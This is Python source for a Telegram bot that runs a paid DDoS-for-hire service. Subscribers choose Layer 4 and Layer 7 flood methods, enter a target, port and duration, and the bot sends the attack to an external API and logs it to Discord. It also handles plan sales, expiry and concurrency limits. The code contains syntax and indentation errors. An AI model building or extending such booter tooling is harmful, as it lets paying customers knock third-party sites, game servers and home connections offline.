import telepot
import time
import datetime
import requests
import threading
import subprocess
import json
from telepot.loop import MessageLoop
import pytz
from urllib.parse import urlparse
import ipaddress
from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton


webhook_url = ''  # discord webhook here
TOKEN = ''  # your bot token here

attack_slots = 2
attack_slots_lock = threading.Lock()
last_attack_time = None
successful_attacks = []

def read_authorized_users():
    try:
        with open('users.txt', 'r') as f:
            lines = f.readlines()
            authorized_users = {}
            for line in lines:
                if line.strip():
                    user_id, expiry_date_str, max_duration_str, concurrents_str = line.strip().split(':')
                    expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
                    max_duration = int(max_duration_str)
                    concurrents = int(concurrents_str)
                    authorized_users[int(user_id)] = {
                        'expiry_date': expiry_date,
                        'max_duration': max_duration,
                        'concurrents': concurrents
                    }
            return authorized_users
    except FileNotFoundError:
        return {}

def write_authorized_users(authorized_users):
    with open('users.txt', 'w') as f:
        for user_id, info in authorized_users.items():
            expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
            max_duration_str = str(info['max_duration'])
            concurrents_str = str(info['concurrents'])
            f.write(f"{user_id}:{expiry_date_str}:{max_duration_str}:{concurrents_str}\n")

def is_user_authorized(user_id):
    global authorized_users
    if user_id not in authorized_users:
        return False
    info = authorized_users[user_id]
    if info['expiry_date'] < datetime.datetime.now():
        del authorized_users[user_id]
        write_authorized_users(authorized_users)
        bot.sendMessage(user_id, 'Your plan has expired. Contact @atusssssssss to renew.')
        return False
    return True

def add_admin_user(user_id):
    global admin_users
    admin_users.add(user_id)

def remove_admin_user(user_id):
    global admin_users
    if user_id in admin_users:
        admin_users.remove(user_id)

def get_username(user_id):
    user = bot.getChat(user_id)
    if 'username' in user:
        return user['username']
    else:
        return None

def convert_to_vietnam_time(utc_time):
    utc = pytz.timezone('UTC')
    vietnam = pytz.timezone('Asia/Ho_Chi_Minh')

    utc_time = utc_time.replace(tzinfo=utc)
    vietnam_time = utc_time.astimezone(vietnam)

    return vietnam_time

blacklisted_targets = set()

def read_blacklisted_targets():
    try:
        with open('blacklist.txt', 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line.strip():
                    blacklisted_targets.add(line.strip())
    except FileNotFoundError:
        pass

def write_blacklisted_targets():
    with open('blacklist.txt', 'w') as f:
        for target in blacklisted_targets:
            f.write(f"{target}\n")

def is_ip_blacklisted(ip_address):
    return ip_address in blacklisted_targets

def read_methods():
    try:
        with open('methods.txt', 'r') as f:
            methods = [method.strip().lower() for method in f.readlines()]
            return methods
    except FileNotFoundError:
        return []

def is_ip_in_blacklist(ip_address):
    for blacklisted_ip in blacklisted_targets:
        if ip_address == blacklisted_ip:
            return True
    return False

def is_domain_in_blacklist(domain):
    for blacklisted_domain in blacklisted_targets:
        if blacklisted_domain in domain:
            return True
    return False

def get_target_type(target):
    try:
        ipaddress.ip_address(target)
        return 'ip'
    except ValueError:
        return 'domain'

def is_target_blacklisted(target):
    target_type = get_target_type(target)
    if target_type == 'domain':
        domain = get_domain_from_target(target)
        return is_domain_in_blacklist(domain)
    elif target_type == 'ip':
        return is_ip_in_blacklist(target)
    return False

def get_domain_from_target(target):
    parsed_url = urlparse(target)
    return parsed_url.netloc

def decrease_attack_slots_for_user(user_id):
    global authorized_users
    if user_id in authorized_users:
        with attack_slots_lock:
            authorized_users[user_id]['attack_slots'] -= 1
            write_authorized_users(authorized_users)




def perform_attack(target, port, duration, method, user_id):
    info = authorized_users[user_id]
    max_duration = info['max_duration']
    concurrents = info['concurrents']
    user_attack_slots = info.get('attack_slots', 0)
    url = f'YOUR API HERE'
    response = requests.get(url)
    response_json = response.json()
        
    bot.sendMessage(user_id, f'<strong>Attack Sent!!</strong>\n\n<strong>Target:</strong> {target}\n<strong>Port:</strong> {port}\n<strong>Duration:</strong> {duration}\n<strong>Method:</strong> {method}', parse_mode='HTML')
        threading.Timer(float(duration), decrease_attack_slots_for_user, args=[user_id]).start()

       
        vietnam_time = convert_to_vietnam_time(datetime.datetime.now())
        username = get_username(user_id) or f'Unknown user {user_id}'
        attack_info = {
            'target': target,
            'port': port,
            'duration': duration,
            'method': method,
            'user_id': user_id,
            'time': datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        successful_attacks.append(attack_info)
        
       
        message = f"**Buffalo Attack Logs:**\n\n**Username:** {username}\n**Target:** {target}\n**Port:** {port}\n**Duration:** {duration}\n**Method:** {method}\n**Date:** {vietnam_time.strftime('%Y-%m-%d %H:%M:%S')}"
        embeds = [
          {
            'title': message,
            'color': 16711680 
          }
        ]
        
        payload = {
          'username': 'Buffalo Webhook',
          'embeds': embeds
        }

        headers = {
            'Content-Type': 'application/json'
        }

        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

        if response.status_code != 204:
            print('Failed to send message to Discord webhook')
class UserState:
    def __init__(self, method=None, target=None, port=None, time=None):
        self.method = method
        self.target = target
        self.port = port
        self.time = time

states = {}
def handle_message(msg):
    global authorized_users
    global admin_users
    global attack_slots
    global last_attack_time
    global successful_attacks

    
  
    content_type, chat_type, chat_id = telepot.glance(msg)
    user_id = msg['from']['id']
    if not last_attack_time:
        last_attack_time = None

    if not is_user_authorized(user_id):
        bot.sendMessage(chat_id, f'You dont have plan. Contact @atusssssssss for buying plan.\n\nYour ID: <code>{user_id}</code>', parse_mode='HTML')
        return

    if user_id not in admin_users:
        if content_type == 'text' and (msg['text'].startswith('/adduser') or msg['text'].startswith('/removeuser') or msg['text'].startswith('/updateuser') or msg['text'].startswith('/userlist')):
            bot.sendMessage(chat_id, 'Only admin can using commands.')
            return
          
    if 'states' not in globals():
        global states
        states = {}
      
    if content_type == 'text':
        text = msg['text']
        if text == '/help':
            message = '''<strong>User Commands:</strong>
            
- /methods - <strong>Show attack methods.</strong>
- /attack - <strong>Sent attack.</strong>
- /running - <strong>Show running attacks.</strong>
- /info - <strong>Show bot information.</strong>
- /getid - <strong>Get your ID.</strong>
- /plan - <strong>See your plan.</strong>

<strong>Admin Commands:</strong>

- /adduser - <strong>Add new user.</strong>
- /removeuser - <strong>Remove user.</strong>
- /updateuser - <strong>Update user information.</strong>
- /userlist - <strong>Show all users information.</strong>
- /blacklist - <strong>Add target to BlackList.</strong>
- /unblacklist - <strong>Remove target from BlackList.</strong>
- /listblacklist - <strong>See all BlackList.</strong>'''
            bot.sendMessage(chat_id, message, parse_mode='HTML')



        elif text == '/plan':
            info = authorized_users.get(user_id)
            if info:
                username = get_username(user_id) or f'Unknown user {user_id}'
                expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
                max_duration_str = str(info['max_duration'])
                concurrents = info.get('concurrents', 0)
                message = f'<strong>Plan details for</strong> @{username}\n<strong>User ID:</strong> <code>{user_id}</code>\n<strong>Expire Time:</strong> {expiry_date_str}\n<strong>Max Time:</strong> {max_duration_str} seconds\n<strong>Concurrents:</strong> {concurrents}'
                bot.sendMessage(chat_id, message, parse_mode='HTML')

        
        elif text.startswith('/getid'):
            user_id = msg['from']['id']
            username = get_username(user_id)
            message = f'<b>Username:</b> @{username}\n<b>User ID:</b> <code>{user_id}</code>'
            bot.sendMessage(chat_id, message, parse_mode='HTML')
        elif text.startswith('/blacklist'):
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /blacklist [target]')
                return

            target = args[0]
            if target in blacklisted_targets:
                bot.sendMessage(chat_id, f'Target "{target}" is already exist.')
                return
            else:
                blacklisted_targets.add(target)
                write_blacklisted_targets()
                bot.sendMessage(chat_id, f'Target "{target}" has been added to the blacklist.')
        elif text.startswith('/unblacklist'):
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            args = text.split()[1:]
            if len(args) != 1:
                bot.sendMessage(chat_id, 'Using: /unblacklist [target]')
                return

            target = args[0]
            if target in blacklisted_targets:
                blacklisted_targets.remove(target)
                write_blacklisted_targets()
                bot.sendMessage(chat_id, f'Target "{target}" has been removed from the blacklist.')
            else:
                bot.sendMessage(chat_id, f'Target "{target}" is not in the blacklist.')
        elif text == '/listblacklist':
            if user_id not in admin_users:
                bot.sendMessage(chat_id, 'Only admin can use this command.')
                return

            if not blacklisted_targets:
                bot.sendMessage(chat_id, 'The blacklist is empty.')
                return

            message = '<strong>Blacklisted Targets</strong>\n'

            for target in blacklisted_targets:
                message += f'- {target}\n'

            bot.sendMessage(chat_id, message, parse_mode='HTML')

        elif text == '/methods':
            methods = read_methods()
            if not methods:
                bot.sendMessage(chat_id, 'No methods found.')
            else:
                method_list = '\n- '.join(methods)
                message = f'<strong>List Methods</strong>\n- {method_list}'
                bot.sendMessage(chat_id, message, parse_mode='HTML')
        elif text == '/info':
            message = '<strong>Owner</strong>: @atusssssssss\n<strong>Version</strong>: 2.0\nIf you want to buy source. Contact @atusssssssss.'
            bot.sendMessage(chat_id, message, parse_mode='HTML')

        elif text == '/running':
            handle_running_command(chat_id)
        elif text.startswith('/attack'):
            if not is_user_authorized(user_id):
                bot.sendMessage(chat_id, 'You dont have plan. Contact @atusssssssss for buying plan.')
                return

            
                return
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                                      [KeyboardButton(text='LAYER4'), KeyboardButton(text='LAYER7')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Choose an attack method:', reply_markup=keyboard)
            last_attack_time = datetime.datetime.now()
            
        elif text == 'LAYER7':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='DESTROY'), KeyboardButton(text='HTTPS'), KeyboardButton(text='CLOUDFLARE')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Select method:', reply_markup=keyboard)
        
        
        elif text == 'LAYER4':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='TCPLEGIT'), KeyboardButton(text='HOME-KILL'), KeyboardButton(text='SSH')],
                    [KeyboardButton(text='GAME-KILL'), KeyboardButton(text='EQUINOXV2'), KeyboardButton(text='HANDSHAKE')],
                    [KeyboardButton(text='SOCKET'), KeyboardButton(text='SPOOF-FLOOD')],
                    [KeyboardButton(text='❌ Cancel')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Select method', reply_markup=keyboard)
        elif text.lower() == 'cancel':
            keyboard = ReplyKeyboardMarkup(
                keyboard=[
                    [KeyboardButton(text='/methods'), KeyboardButton(text='/attack')],
                    [KeyboardButton(text='/info'), KeyboardButton(text='/getid'), KeyboardButton(text='/running')],
                ],
                resize_keyboard=True,
                one_time_keyboard=True
            )
            bot.sendMessage(chat_id, 'Back to command list:', reply_markup=keyboard)




        elif text in ['TCPLEGIT', 'HOME-KILL', 'SSH', 'GAME-KILL', 'EQUINOXV2', 'HANDSHAKE', 'SOCKET', 'SPOOF-FLOOD']:
          method = text
           
          bot.sendMessage(chat_id, 'Enter target:')
            
            
          user_state = UserState(method=method)
          states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['TCPLEGIT', 'HOME-KILL', 'SSH', 'GAME-KILL', 'EQUINOXV2', 'HANDSHAKE', 'SOCKET', 'SPOOF-FLOOD']:
            
            
            user_state = states[chat_id]
            method = user_state.method
            if not user_state.target:
                
                user_state.target = text
                if is_target_blacklisted(user_state.target):
                  bot.sendMessage(chat_id, 'Target Blacklisted.')
                  del states[chat_id]  
                  return
                bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 4\n<strong>Method:</strong> {method}\n└ <strong>Enter Port:</strong>', parse_mode='HTML')

            elif not user_state.port:
              
                
              user_state.port = text
              
              bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 4\n<strong>Method:</strong> {method}\n<strong>Port:</strong> {user_state.port}\n└ <strong>Enter Time:</strong>', parse_mode='HTML')

            elif not user_state.time:
              
              user_state.time = text

              
              info = authorized_users[user_id]
              max_duration = info['max_duration']
              concurrents = info.get('concurrents', 0)
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @atusssssssss to update your plan.')
                del states[chat_id]  
                return
              if user_attack_slots >= concurrents:
                bot.sendMessage(chat_id, 'MAX CONCURRENTS. Your concurrents limit has been reached. Please wait for an available slot.')
                del states[chat_id]  
                return
              if int(user_state.time) > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
                del states[chat_id]  
                return

            
            
              perform_attack(user_state.target, user_state.port, user_state.time, method, chat_id)
              threading.Timer(float(user_state.time), decrease_attack_slots_for_user, args=[user_id]).start()
              info['attack_slots'] = user_attack_slots + 1
              write_authorized_users(authorized_users)
              del states[chat_id]





      
        elif text == 'DESTROY' or text == 'HTTPS' or text == 'CLOUDFLARE':
            
            method = text
            
            bot.sendMessage(chat_id, 'Enter target:')
            
            
            user_state = UserState(method=method)
            states[chat_id] = user_state
        elif chat_id in states and states[chat_id].method in ['DESTROY', 'HTTPS', 'CLOUDFLARE']:
            
            
            
            user_state = states[chat_id]
            method = user_state.method
            if not user_state.target:
                
                user_state.target = text
                if is_target_blacklisted(user_state.target):
                  bot.sendMessage(chat_id, 'Target Blacklisted.')
                  del states[chat_id]  
                  return
                
                if 'http://' in user_state.target:
                    user_state.port = '80'
                elif 'https://' in user_state.target:
                    user_state.port = '443'
                else:
                    
                    bot.sendMessage(chat_id, 'Invalid URL')
                    return
                
                bot.sendMessage(chat_id, f'🌐 {user_state.target}\n<strong>🖥️ Layer:</strong> 7\n<strong>Method:</strong> {method}\n<strong>Port:</strong> {user_state.port}\n└ <strong>Enter Time:</strong>', parse_mode='HTML')
            elif not user_state.time:
              
              user_state.time = text

              
              info = authorized_users[user_id]
              max_duration = info['max_duration']
              concurrents = info.get('concurrents', 0)
              user_attack_slots = info.get('attack_slots', 0)
              if concurrents <= 0:
                bot.sendMessage(chat_id, 'Your concurrents count is zero. Contact @atusssssssss to update your plan.')
                del states[chat_id]  
                return
              if user_attack_slots >= concurrents:
                bot.sendMessage(chat_id, 'MAX CONCURRENTS. Your concurrents limit has been reached. Please wait for an available slot.')
                del states[chat_id]  
                return
              if int(user_state.time) > max_duration:
                bot.sendMessage(chat_id, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
                del states[chat_id]  
                return

            
             
              perform_attack(user_state.target, user_state.port, user_state.time, method, chat_id)
              threading.Timer(float(user_state.time), decrease_attack_slots_for_user, args=[user_id]).start()
              info['attack_slots'] = user_attack_slots + 1
              write_authorized_users(authorized_users)
              del states[chat_id]
        
        
        
        
        elif text.startswith('/adduser'):
            args = text.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /adduser [id] [expiry date] [max attack times] [concurrents]')
                return

            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            authorized_users[target_user_id] = {
                'expiry_date': expiry_date,
                'max_duration': max_duration,
                'concurrents': concurrents
            }
            write_authorized_users(authorized_users)
            bot.sendMessage(chat_id, 'Added "{}" to access list with expiry date {} and maximum duration {} seconds and maximum concurrents is {}.'.format(target_user_id, expiry_date_str, max_duration, concurrents))
        elif text.startswith('/removeuser'):
            bot.sendMessage(chat_id, 'Using: /removeuser [id]')
            user_id = int(text.split()[1])
            if user_id in authorized_users:
                del authorized_users[user_id]
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Removed {} from the access list.'.format(user_id))
            else:
                bot.sendMessage(chat_id, 'User {} not in the access list.'.format(user_id))
        elif text.startswith('/updateuser'):
            args = text.split()[1:]
            if len(args) != 4:
                bot.sendMessage(chat_id, 'Using: /updateuser [id] [expiry date] [max attack times] [concurrents]')
                return

            target_user_id = int(args[0])
            expiry_date_str = args[1]
            max_duration = int(args[2])
            concurrents = int(args[3])
            expiry_date = datetime.datetime.strptime(expiry_date_str, '%Y-%m-%d')
            if target_user_id in authorized_users:
                authorized_users[target_user_id]['expiry_date'] = expiry_date
                authorized_users[target_user_id]['max_duration'] = max_duration
                authorized_users[target_user_id]['concurrents'] = concurrents
                write_authorized_users(authorized_users)
                bot.sendMessage(chat_id, 'Updated user {} with expiry date {}, maximum duration {} seconds, and {} concurrents.'.format(target_user_id, expiry_date_str, max_duration, concurrents))
            else:
                bot.sendMessage(chat_id, 'User {} is not in the access list.'.format(target_user_id))
        elif text == '/userlist':
            handle_userlist_command(chat_id)
        


def handle_userlist_command(chat_id):
    global authorized_users
    userlist = ''
    for user_id, info in authorized_users.items():
        username = get_username(user_id)
        expiry_date_str = info['expiry_date'].strftime('%Y-%m-%d')
        max_duration_str = str(info['max_duration'])
        concurrents_str = str(info['concurrents'])
        userlist += f'<strong>Username:</strong> @{username}\n<strong>User ID: </strong><code>{user_id}</code>\n<strong>Expiry Date:</strong> {expiry_date_str}\n<strong>Max Duration:</strong> {max_duration_str}\n<strong>Concurrents:</strong> {concurrents_str}\n\n'
    bot.sendMessage(chat_id, userlist, parse_mode='HTML')



def handle_running_command(chat_id):
    global successful_attacks

    if len(successful_attacks) == 0:
        message = '<strong>NO ONGOING ATTACKS.</strong>'
    else:
        message = '<strong>ONGOING ATTACKS:</strong>\n\n'
        for attack in successful_attacks:
            user_id = attack["user_id"]
            username = get_username(user_id)
            target = attack["target"]
            port = attack["port"]
            duration = int(attack["duration"])
            method = attack["method"]
            start_time = datetime.datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')

            info = authorized_users.get(user_id)
            if info and info.get('attack_slots', 0) > 0:
                user_attack_slots = info.get('attack_slots', 0)
                remaining_time = duration - (datetime.datetime.now() - start_time).total_seconds()
                remaining_time_str = f'{int(remaining_time)} seconds' if remaining_time > 0 else 'Finished'
                concurrents = info.get('concurrents', 0)
                remaining_concurrents = concurrents - user_attack_slots
                message += f'<strong>Username:</strong> @{username}\n<strong>User ID:</strong> {user_id}\n<strong>Remaining Concurrents:</strong> {remaining_concurrents}/{concurrents}\n<strong>Target:</strong> {target}\n<strong>Port:</strong> {port}\n<strong>Time Remaining:</strong> {remaining_time_str}\n<strong>Method:</strong> {method}\n\n'
            else:
                successful_attacks.remove(attack)

    bot.sendMessage(chat_id, message, parse_mode='HTML')








def check_expired_users():
    global authorized_users
    now = datetime.datetime.now()
    for user_id, user_info in list(authorized_users.items()):
        expiry_date = user_info['expiry_date']
        if expiry_date < now:
            del authorized_users[user_id]
            write_authorized_users(authorized_users)
            bot.sendMessage(user_id, 'Your plan has expired. Contact @atusssssssss to renew.')
    threading.Timer(86400, check_expired_users).start()

def increase_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots += 1

def decrease_attack_slots():
    global attack_slots
    with attack_slots_lock:
        attack_slots -= 1

if __name__ == '__main__':
    read_blacklisted_targets()
    bot = telepot.Bot(TOKEN)
    authorized_users = read_authorized_users()
    admin_users = set()
    add_admin_user()  # admin user id here

    MessageLoop(bot, handle_message).run_as_thread()
    print('Bot running...')
    check_expired_users()
    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            print('\nBot stopped.')
            break
